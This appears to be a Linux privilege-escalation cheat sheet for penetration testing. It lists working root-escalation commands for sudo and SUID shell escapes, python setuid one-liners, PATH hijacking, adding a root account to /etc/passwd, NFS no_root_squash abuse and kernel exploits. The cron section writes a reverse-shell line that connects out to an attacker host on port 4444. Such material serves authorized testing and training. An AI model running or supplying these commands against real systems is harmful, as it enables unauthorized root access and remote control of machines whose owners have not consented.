# Linux PrivEsc techniques — top vectors with commands

Each technique maps to an enumeration finding. Identify the finding first, then apply the technique.

## Sudo misconfiguration

```bash
sudo -l
# Look for: (ALL) NOPASSWD: /usr/bin/vim
# or: (root) NOPASSWD: /bin/bash

# GTFObins is your reference for every binary found here
# https://gtfobins.github.io/

# Example: sudo vim → shell
sudo vim -c ':!/bin/bash'

# Example: sudo find
sudo find . -exec /bin/bash \; -quit
```

## SUID binary abuse

```bash
find / -perm -4000 -type f 2>/dev/null
# Cross-reference each binary at GTFObins

# Example: /usr/bin/cp has SUID
# Add root user to /etc/passwd via cp abuse

# Example: /usr/bin/python3 has SUID
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Cron job hijack

Finding: root cron executes `/opt/scripts/backup.sh` — script is world-writable.

```bash
# Overwrite the script
echo "bash -i >& /dev/tcp/LHOST/4444 0>&1" >> /opt/scripts/backup.sh
# Wait for cron to fire → catch shell on nc -lvnp 4444
```

## PATH hijacking

Finding: a SUID binary or cron script calls a command without full path (e.g., calls `service` not `/bin/service`).

```bash
# Create malicious binary in writable dir
echo "/bin/bash" > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# Trigger the SUID binary — it calls your fake 'service'
```

## Linux capabilities

```bash
getcap -r / 2>/dev/null
# Example: /usr/bin/python3 = cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash")'
```

Reference: https://gtfobins.github.io/ — filter by "capabilities" column.

## Writable /etc/passwd

```bash
# If /etc/passwd is writable:
openssl passwd -1 -salt salt123 mypassword    # generate hash
echo "hacker:$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker
```

## NFS no_root_squash

```bash
# On attacker machine: mount the share
mkdir /tmp/nfs
mount -o rw,vers=2 <target>:/share /tmp/nfs
# Copy bash, set SUID
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# On target:
/share/bash -p     # -p preserves effective UID (root)
```

## Kernel exploit (last resort)

```bash
uname -r           # get kernel version
searchsploit linux kernel <version>
# Common: DirtyCow (CVE-2016-5195), overlayfs (CVE-2015-1328)
# Compile on a matching architecture, test in lab first
gcc exploit.c -o exploit && ./exploit
```

Kernel exploits risk crashing the target — use only after all other vectors exhausted.
